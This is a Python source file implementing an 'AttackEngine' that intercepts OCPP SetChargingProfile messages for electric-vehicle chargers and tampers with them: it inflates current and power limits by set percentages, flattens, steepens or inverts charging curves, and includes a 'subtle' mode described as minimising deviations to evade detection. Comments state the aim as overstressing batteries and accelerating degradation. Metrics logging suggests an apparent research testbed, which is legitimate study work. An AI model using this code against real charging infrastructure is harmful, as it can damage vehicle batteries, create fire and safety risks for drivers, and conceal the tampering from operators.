"""
Attack Engine for manipulating OCPP charging profiles
"""

from enum import Enum
from typing import Dict, Any, Optional
from dataclasses import dataclass
from datetime import datetime
import logging
import yaml
import random

logger = logging.getLogger(__name__)


class AttackStrategy(Enum):
    """Attack strategy types"""
    AGGRESSIVE = "aggressive"  # Maximum parameter deviations
    SUBTLE = "subtle"          # Minimal deviations to evade detection
    RANDOM = "random"          # Randomized deviations
    TARGETED = "targeted"      # Specific parameter targeting


class ManipulationType(Enum):
    """Types of charging profile manipulations"""
    VOLTAGE_OVERSTRESS = "voltage_overstress"
    CURRENT_OVERSTRESS = "current_overstress"
    SUBOPTIMAL_CURVE = "suboptimal_curve"
    SOC_RANGE_ABUSE = "soc_range_abuse"


@dataclass
class AttackConfig:
    """Configuration for attack engine"""
    enabled: bool = True
    strategy: AttackStrategy = AttackStrategy.AGGRESSIVE
    
    # Voltage manipulation settings
    voltage_enabled: bool = True
    voltage_deviation_percent: float = 15.0
    voltage_target_range: tuple = (4.2, 4.35)
    
    # Current manipulation settings
    current_enabled: bool = True
    current_deviation_percent: float = 25.0
    current_target_range: tuple = (50, 80)
    
    # Charging curve manipulation settings
    curve_enabled: bool = True
    curve_modification_type: str = "flatten"
    
    # Randomization settings
    randomization_enabled: bool = False
    randomization_seed: Optional[int] = 42
    randomization_deviation_range: tuple = (5, 30)
    
    @classmethod
    def from_yaml(cls, yaml_path: str) -> 'AttackConfig':
        """
        Load attack configuration from YAML file
        
        Args:
            yaml_path: Path to YAML configuration file
            
        Returns:
            AttackConfig instance
        """
        with open(yaml_path, 'r') as f:
            config_data = yaml.safe_load(f)
        
        attack_cfg = config_data.get('attack_config', {})
        manipulations = attack_cfg.get('manipulations', {})
        voltage_cfg = manipulations.get('voltage', {})
        current_cfg = manipulations.get('current', {})
        curve_cfg = manipulations.get('charging_curve', {})
        randomization_cfg = attack_cfg.get('randomization', {})
        
        # Parse strategy
        strategy_str = attack_cfg.get('strategy', 'aggressive')
        try:
            strategy = AttackStrategy(strategy_str)
        except ValueError:
            logger.warning(f"Invalid strategy '{strategy_str}', defaulting to AGGRESSIVE")
            strategy = AttackStrategy.AGGRESSIVE
        
        return cls(
            enabled=attack_cfg.get('enabled', True),
            strategy=strategy,
            voltage_enabled=voltage_cfg.get('enabled', True),
            voltage_deviation_percent=voltage_cfg.get('deviation_percent', 15.0),
            voltage_target_range=tuple(voltage_cfg.get('target_range', [4.2, 4.35])),
            current_enabled=current_cfg.get('enabled', True),
            current_deviation_percent=current_cfg.get('deviation_percent', 25.0),
            current_target_range=tuple(current_cfg.get('target_range', [50, 80])),
            curve_enabled=curve_cfg.get('enabled', True),
            curve_modification_type=curve_cfg.get('modification_type', 'flatten'),
            randomization_enabled=randomization_cfg.get('enabled', False),
            randomization_seed=randomization_cfg.get('seed', 42),
            randomization_deviation_range=tuple(randomization_cfg.get('deviation_range', [5, 30]))
        )
    
    @classmethod
    def from_dict(cls, config_dict: Dict[str, Any]) -> 'AttackConfig':
        """
        Create AttackConfig from dictionary
        
        Args:
            config_dict: Configuration dictionary
            
        Returns:
            AttackConfig instance
        """
        # Parse strategy
        strategy_str = config_dict.get('strategy', 'aggressive')
        if isinstance(strategy_str, str):
            try:
                strategy = AttackStrategy(strategy_str)
            except ValueError:
                logger.warning(f"Invalid strategy '{strategy_str}', defaulting to AGGRESSIVE")
                strategy = AttackStrategy.AGGRESSIVE
        else:
            strategy = strategy_str
        
        return cls(
            enabled=config_dict.get('enabled', True),
            strategy=strategy,
            voltage_enabled=config_dict.get('voltage_enabled', True),
            voltage_deviation_percent=config_dict.get('voltage_deviation_percent', 15.0),
            voltage_target_range=config_dict.get('voltage_target_range', (4.2, 4.35)),
            current_enabled=config_dict.get('current_enabled', True),
            current_deviation_percent=config_dict.get('current_deviation_percent', 25.0),
            current_target_range=config_dict.get('current_target_range', (50, 80)),
            curve_enabled=config_dict.get('curve_enabled', True),
            curve_modification_type=config_dict.get('curve_modification_type', 'flatten'),
            randomization_enabled=config_dict.get('randomization_enabled', False),
            randomization_seed=config_dict.get('randomization_seed', 42),
            randomization_deviation_range=config_dict.get('randomization_deviation_range', (5, 30))
        )


class AttackEngine:
    """
    Core attack logic for manipulating charging profiles
    """
    
    def __init__(self, config: AttackConfig, metrics_collector=None):
        """
        Initialize attack engine with configuration
        
        Args:
            config: Attack configuration
            metrics_collector: Optional metrics collector for logging
        """
        self.config = config
        self.metrics_collector = metrics_collector
        
        # Initialize random number generator if randomization is enabled
        if self.config.randomization_enabled:
            random.seed(self.config.randomization_seed)
            logger.info(f"Random seed set to: {self.config.randomization_seed}")
        
        logger.info(f"AttackEngine initialized with strategy: {config.strategy.value}")
        logger.info(f"Attack enabled: {config.enabled}")
        logger.info(f"Voltage manipulation: {config.voltage_enabled}")
        logger.info(f"Current manipulation: {config.current_enabled}")
        logger.info(f"Curve manipulation: {config.curve_enabled}")
    
    def should_manipulate(self, message: Dict[str, Any]) -> bool:
        """
        Determine if message should be manipulated based on type and config
        
        Args:
            message: OCPP message dictionary
            
        Returns:
            True if message should be manipulated
        """
        if not self.config.enabled:
            logger.debug("Attack engine disabled, skipping manipulation")
            return False
        
        # Check if this is a SetChargingProfile message
        message_type = self._get_message_type(message)
        is_target_message = message_type in ["SetChargingProfile", "SetChargingProfileRequest"]
        
        if is_target_message:
            logger.debug(f"Target message detected: {message_type}")
        
        return is_target_message
    
    def get_message_id(self, message: Dict[str, Any]) -> str:
        """
        Extract message ID from OCPP message
        
        Args:
            message: OCPP message dictionary
            
        Returns:
            Message ID string
        """
        # OCPP messages are typically [MessageTypeId, MessageId, Action, Payload]
        if isinstance(message, list) and len(message) >= 2:
            return str(message[1])
        return "unknown"
    
    def manipulate_charging_profile(self, profile: Dict[str, Any]) -> Dict[str, Any]:
        """
        Apply attack manipulations to charging profile
        
        Args:
            profile: Original charging profile from OCPP message
            
        Returns:
            Manipulated charging profile
        """
        import copy
        modified_profile = copy.deepcopy(profile)
        
        try:
            if self.config.voltage_enabled:
                self.apply_voltage_manipulation(modified_profile)
            
            if self.config.current_enabled:
                self.apply_current_manipulation(modified_profile)
            
            if self.config.curve_enabled:
                self.apply_curve_manipulation(modified_profile)
            
            self.log_manipulation(profile, modified_profile)
            
        except Exception as e:
            logger.error(f"Error during profile manipulation: {e}")
            # Return original profile if manipulation fails
            return profile
        
        return modified_profile
    
    def _parse_charging_schedule(self, profile: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """
        Parse charging schedule from profile (handles both OCPP 1.6 and 2.0/2.0.1)
        
        Args:
            profile: Charging profile dictionary
            
        Returns:
            Charging schedule dictionary or None
        """
        # OCPP 1.6: chargingSchedule is a single object
        if 'chargingSchedule' in profile:
            schedule = profile['chargingSchedule']
            # OCPP 2.0/2.0.1: chargingSchedule is an array
            if isinstance(schedule, list):
                return schedule[0] if schedule else None
            return schedule
        
        return None
    
    def _get_schedule_periods(self, schedule: Dict[str, Any]) -> list:
        """
        Get charging schedule periods from schedule
        
        Args:
            schedule: Charging schedule dictionary
            
        Returns:
            List of charging schedule periods
        """
        return schedule.get('chargingSchedulePeriod', [])
    
    def _validate_parameter_bounds(self, value: float, min_val: float, max_val: float) -> float:
        """
        Validate and clamp parameter value to bounds
        
        Args:
            value: Value to validate
            min_val: Minimum allowed value
            max_val: Maximum allowed value
            
        Returns:
            Clamped value
        """
        if value < min_val:
            logger.warning(f"Value {value} below minimum {min_val}, clamping")
            return min_val
        if value > max_val:
            logger.warning(f"Value {value} above maximum {max_val}, clamping")
            return max_val
        return value
    
    def _calculate_deviation(self, base_deviation: float, strategy: AttackStrategy) -> float:
        """
        Calculate deviation percentage based on attack strategy
        
        Args:
            base_deviation: Base deviation percentage from config
            strategy: Attack strategy to apply
            
        Returns:
            Calculated deviation percentage
        """
        if strategy == AttackStrategy.AGGRESSIVE:
            # Use maximum deviation (base deviation as configured)
            return base_deviation
        
        elif strategy == AttackStrategy.SUBTLE:
            # Use minimal deviation (reduce to 20% of base)
            return base_deviation * 0.2
        
        elif strategy == AttackStrategy.RANDOM:
            # Use random deviation within configured range
            if self.config.randomization_enabled:
                min_dev, max_dev = self.config.randomization_deviation_range
                return random.uniform(min_dev, max_dev)
            else:
                # Fallback to random between 0 and base deviation
                return random.uniform(0, base_deviation)
        
        elif strategy == AttackStrategy.TARGETED:
            # Use base deviation (can be customized per parameter in future)
            return base_deviation
        
        else:
            logger.warning(f"Unknown strategy {strategy}, using base deviation")
            return base_deviation
    
    def apply_aggressive_strategy(self, profile: Dict[str, Any]) -> None:
        """
        Apply aggressive attack strategy with maximum parameter deviations
        
        Args:
            profile: Charging profile to modify (modified in-place)
        """
        logger.info("Applying AGGRESSIVE strategy")
        
        # Apply all enabled manipulations with maximum deviations
        if self.config.voltage_enabled:
            self.apply_voltage_manipulation(profile)
        
        if self.config.current_enabled:
            self.apply_current_manipulation(profile)
        
        if self.config.curve_enabled:
            self.apply_curve_manipulation(profile)
    
    def apply_subtle_strategy(self, profile: Dict[str, Any]) -> None:
        """
        Apply subtle attack strategy with minimal deviations to evade detection
        
        Args:
            profile: Charging profile to modify (modified in-place)
        """
        logger.info("Applying SUBTLE strategy")
        
        # Apply manipulations with reduced deviations
        # The _calculate_deviation method will automatically reduce deviations
        if self.config.voltage_enabled:
            self.apply_voltage_manipulation(profile)
        
        if self.config.current_enabled:
            self.apply_current_manipulation(profile)
        
        # Skip curve manipulation for subtle strategy to be less detectable
        logger.debug("Skipping curve manipulation for subtle strategy")
    
    def apply_random_strategy(self, profile: Dict[str, Any]) -> None:
        """
        Apply random attack strategy with randomized deviations
        
        Args:
            profile: Charging profile to modify (modified in-place)
        """
        logger.info("Applying RANDOM strategy")
        
        # Randomly decide which manipulations to apply
        if self.config.voltage_enabled and random.random() > 0.3:
            self.apply_voltage_manipulation(profile)
        
        if self.config.current_enabled and random.random() > 0.3:
            self.apply_current_manipulation(profile)
        
        if self.config.curve_enabled and random.random() > 0.5:
            self.apply_curve_manipulation(profile)
    
    def apply_targeted_strategy(self, profile: Dict[str, Any], target_params: Optional[list] = None) -> None:
        """
        Apply targeted attack strategy for specific parameters
        
        Args:
            profile: Charging profile to modify (modified in-place)
            target_params: List of parameters to target (e.g., ['voltage', 'current'])
        """
        logger.info("Applying TARGETED strategy")
        
        if target_params is None:
            # Default to all enabled parameters
            target_params = []
            if self.config.voltage_enabled:
                target_params.append('voltage')
            if self.config.current_enabled:
                target_params.append('current')
            if self.config.curve_enabled:
                target_params.append('curve')
        
        # Apply only targeted manipulations
        if 'voltage' in target_params and self.config.voltage_enabled:
            self.apply_voltage_manipulation(profile)
        
        if 'current' in target_params and self.config.current_enabled:
            self.apply_current_manipulation(profile)
        
        if 'curve' in target_params and self.config.curve_enabled:
            self.apply_curve_manipulation(profile)
    
    def apply_voltage_manipulation(self, profile: Dict[str, Any]) -> None:
        """
        Modify voltage limits based on attack scenario
        
        Args:
            profile: Charging profile to modify (modified in-place)
        """
        logger.debug("Applying voltage manipulation")
        
        schedule = self._parse_charging_schedule(profile)
        if not schedule:
            logger.warning("No charging schedule found in profile")
            return
        
        periods = self._get_schedule_periods(schedule)
        if not periods:
            logger.warning("No charging schedule periods found")
            return
        
        # Get charging rate unit to determine if we're dealing with voltage
        rate_unit = schedule.get('chargingRateUnit', 'A')
        
        # For voltage manipulation, we modify the limit values
        # In OCPP, limits can be in Watts (W) or Amperes (A)
        # We'll manipulate based on the strategy
        for period in periods:
            if 'limit' in period:
                original_limit = period['limit']
                
                # Calculate deviation based on strategy
                deviation = self._calculate_deviation(
                    self.config.voltage_deviation_percent,
                    self.config.strategy
                )
                
                # Apply manipulation (increase limit to overstress)
                modified_limit = original_limit * (1 + deviation / 100.0)
                
                # Note: voltage_target_range is for actual voltage values (e.g., 4.2V)
                # but OCPP limits are typically in A or W, so we don't apply bounds here
                # The bounds are more relevant for battery simulation
                
                period['limit'] = modified_limit
                
                logger.debug(
                    f"Voltage manipulation: {original_limit} -> {modified_limit} "
                    f"({deviation:.2f}% deviation)"
                )
    
    def apply_current_manipulation(self, profile: Dict[str, Any]) -> None:
        """
        Modify current limits based on attack scenario
        
        Args:
            profile: Charging profile to modify (modified in-place)
        """
        logger.debug("Applying current manipulation")
        
        schedule = self._parse_charging_schedule(profile)
        if not schedule:
            logger.warning("No charging schedule found in profile")
            return
        
        periods = self._get_schedule_periods(schedule)
        if not periods:
            logger.warning("No charging schedule periods found")
            return
        
        # Get charging rate unit
        rate_unit = schedule.get('chargingRateUnit', 'A')
        
        # For current manipulation, we modify the limit values
        for period in periods:
            if 'limit' in period:
                original_limit = period['limit']
                
                # Calculate deviation based on strategy
                deviation = self._calculate_deviation(
                    self.config.current_deviation_percent,
                    self.config.strategy
                )
                
                # Apply manipulation (increase current to accelerate degradation)
                modified_limit = original_limit * (1 + deviation / 100.0)
                
                # Note: current_target_range is for guidance, not strict bounds
                # We apply percentage-based manipulation regardless of absolute values
                
                period['limit'] = modified_limit
                
                logger.debug(
                    f"Current manipulation: {original_limit} -> {modified_limit} "
                    f"({deviation:.2f}% deviation)"
                )
    
    def apply_curve_manipulation(self, profile: Dict[str, Any]) -> None:
        """
        Modify charging curve parameters based on attack scenario
        
        Args:
            profile: Charging profile to modify (modified in-place)
        """
        logger.debug(f"Applying curve manipulation: {self.config.curve_modification_type}")
        
        schedule = self._parse_charging_schedule(profile)
        if not schedule:
            logger.warning("No charging schedule found in profile")
            return
        
        periods = self._get_schedule_periods(schedule)
        if not periods or len(periods) < 2:
            logger.warning("Insufficient periods for curve manipulation")
            return
        
        modification_type = self.config.curve_modification_type.lower()
        
        if modification_type == "flatten":
            # Flatten the curve by making all limits equal to the maximum
            max_limit = max(period.get('limit', 0) for period in periods)
            for period in periods:
                if 'limit' in period:
                    period['limit'] = max_limit
            logger.debug(f"Flattened curve to constant limit: {max_limit}")
        
        elif modification_type == "steepen":
            # Steepen the curve by increasing the rate of change
            for i, period in enumerate(periods):
                if 'limit' in period:
                    # Increase limits progressively
                    factor = 1.0 + (i / len(periods)) * 0.5
                    period['limit'] = period['limit'] * factor
            logger.debug("Steepened charging curve")
        
        elif modification_type == "invert":
            # Invert the curve (reverse the order of limits)
            limits = [period.get('limit', 0) for period in periods]
            limits.reverse()
            for i, period in enumerate(periods):
                if 'limit' in period:
                    period['limit'] = limits[i]
            logger.debug("Inverted charging curve")
        
        else:
            logger.warning(f"Unknown curve modification type: {modification_type}")
    
    def log_manipulation(self, original: Dict[str, Any], 
                        modified: Dict[str, Any]) -> None:
        """
        Record manipulation details for analysis
        
        Args:
            original: Original charging profile
            modified: Modified charging profile
        """
        if not self.metrics_collector:
            return
        
        timestamp = datetime.now()
        
        # Extract and compare parameters from both profiles
        manipulation_events = self._extract_manipulation_events(
            original, modified, timestamp
        )
        
        # Log each manipulation event
        for event in manipulation_events:
            self.metrics_collector.log_manipulation(
                timestamp=event['timestamp'],
                original=original,
                modified=modified,
                parameter_name=event['parameter_name'],
                original_value=event['original_value'],
                modified_value=event['modified_value'],
                deviation_percent=event['deviation_percent']
            )
        
        logger.info(f"Logged {len(manipulation_events)} manipulation events")
    
    def _extract_manipulation_events(self, original: Dict[str, Any], 
                                     modified: Dict[str, Any],
                                     timestamp: datetime) -> list:
        """
        Extract individual manipulation events by comparing original and modified profiles
        
        Args:
            original: Original charging profile
            modified: Modified charging profile
            timestamp: Event timestamp
            
        Returns:
            List of manipulation event dictionaries
        """
        events = []
        
        # Parse schedules from both profiles
        orig_schedule = self._parse_charging_schedule(original)
        mod_schedule = self._parse_charging_schedule(modified)
        
        if not orig_schedule or not mod_schedule:
            return events
        
        orig_periods = self._get_schedule_periods(orig_schedule)
        mod_periods = self._get_schedule_periods(mod_schedule)
        
        # Compare each period
        for i, (orig_period, mod_period) in enumerate(zip(orig_periods, mod_periods)):
            orig_limit = orig_period.get('limit', 0)
            mod_limit = mod_period.get('limit', 0)
            
            if orig_limit != mod_limit and orig_limit > 0:
                deviation = ((mod_limit - orig_limit) / orig_limit) * 100.0
                
                events.append({
                    'timestamp': timestamp,
                    'parameter_name': f'limit_period_{i}',
                    'original_value': orig_limit,
                    'modified_value': mod_limit,
                    'deviation_percent': deviation
                })
        
        return events
    
    def get_manipulation_summary(self) -> Dict[str, Any]:
        """
        Get summary of manipulations performed
        
        Returns:
            Dictionary with manipulation statistics
        """
        summary = {
            'strategy': self.config.strategy.value,
            'voltage_enabled': self.config.voltage_enabled,
            'current_enabled': self.config.current_enabled,
            'curve_enabled': self.config.curve_enabled,
            'voltage_deviation_percent': self.config.voltage_deviation_percent,
            'current_deviation_percent': self.config.current_deviation_percent,
            'curve_modification_type': self.config.curve_modification_type
        }
        
        return summary
    
    def _get_message_type(self, message: Dict[str, Any]) -> str:
        """
        Extract message type from OCPP message
        
        Args:
            message: OCPP message dictionary
            
        Returns:
            Message type string
        """
        # OCPP messages are typically [MessageTypeId, MessageId, Action, Payload]
        if isinstance(message, list) and len(message) >= 3:
            return message[2]
        return ""
